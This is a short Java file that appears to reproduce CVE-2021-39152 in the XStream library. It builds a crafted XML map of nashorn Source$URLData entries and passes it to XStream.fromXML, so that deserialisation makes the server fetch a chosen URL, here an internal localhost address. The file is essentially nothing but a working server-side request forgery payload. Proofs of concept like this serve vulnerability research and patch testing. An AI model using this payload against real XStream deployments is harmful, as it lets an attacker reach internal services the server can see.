package com.r17a.xstream.cve.hashmap;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_39152 {
    public static void main(String[] args) {
        String xml = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.runtime.Source_-URLData>\n" +
                "      <url>http://localhost:8080/internal/</url>\n" +
                "      <cs>GBK</cs>\n" +
                "      <hash>1111</hash>\n" +
                "      <array>b</array>\n" +
                "      <length>0</length>\n" +
                "      <lastModified>0</lastModified>\n" +
                "    </jdk.nashorn.internal.runtime.Source_-URLData>\n" +
                "    <jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/>\n" +
                "  </entry>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.runtime.Source_-URLData>\n" +
                "      <url>http://localhost:8080/internal/</url>\n" +
                "      <cs reference='../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs'/>\n" +
                "      <hash>1111</hash>\n" +
                "      <array>b</array>\n" +
                "      <length>0</length>\n" +
                "      <lastModified>0</lastModified>\n" +
                "    </jdk.nashorn.internal.runtime.Source_-URLData>\n" +
                "    <jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/>\n" +
                "  </entry>\n" +
                "</map>";
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
